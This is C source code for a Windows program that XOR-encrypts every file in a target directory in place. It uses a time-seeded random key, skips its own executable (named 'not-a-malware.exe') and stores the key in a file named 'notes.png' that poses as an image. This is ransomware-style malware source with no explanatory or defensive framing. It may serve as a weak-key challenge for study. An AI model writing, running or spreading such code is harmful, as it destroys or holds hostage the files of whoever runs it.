#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char notes[] = "notes.png";
unsigned char key[8];

int encrypt_file(char *filename){
    FILE *f = fopen(filename, "rb+");
    if (!f) return 0;

    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 0; }
    long szl = ftell(f);
    if (szl < 0) { fclose(f); return 0; }
    size_t size = (size_t)szl;

    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return 0; }

    unsigned char *buf = NULL;
    if (size > 0) {
        buf = (unsigned char *)malloc(size);
        if (!buf) { fclose(f); return 0; }

        if (fread(buf, 1, size, f) != size) { free(buf); fclose(f); return 0; }

        for (size_t i = 0; i < size; i++) {
            buf[i] ^= key[i % 8];
        }

        if (fseek(f, 0, SEEK_SET) != 0) { free(buf); fclose(f); return 0; }
        if (fwrite(buf, 1, size, f) != size) { free(buf); fclose(f); return 0; }
        free(buf);
    }

    fclose(f);
    return 1;
}

void getRand(){
    srand(time(0));
    for(int i = 0; i < 8; i++){
        key[i] = rand() & 0xFF;
    }
}

void write_key(){
    FILE *fp = fopen(notes, "ab");
    if (fp) {
        fwrite(&key, 1, 8, fp);
        fclose(fp);
    }
}

int main(int argc, char *argv[]) {
	getRand();
    const char *path = (argc > 1) ? argv[1] : ".";
    char pattern[MAX_PATH];
    char *key;

    snprintf(pattern, sizeof(pattern), "%s\\*", path[0] && (path[strlen(path)-1] == '\\' || path[strlen(path)-1] == '/') ? path : path);

    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(pattern, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return 1;
    }

    do {
        if (!strcmp(ffd.cFileName, ".") || !strcmp(ffd.cFileName, "..") || !strcmp(ffd.cFileName, "not-a-malware.exe") || !strcmp(ffd.cFileName, "notes.png")) continue;
        encrypt_file(ffd.cFileName);
    } while (FindNextFileA(hFind, &ffd) != 0);

    FindClose(hFind);
    atexit(write_key);
    return 0;
}
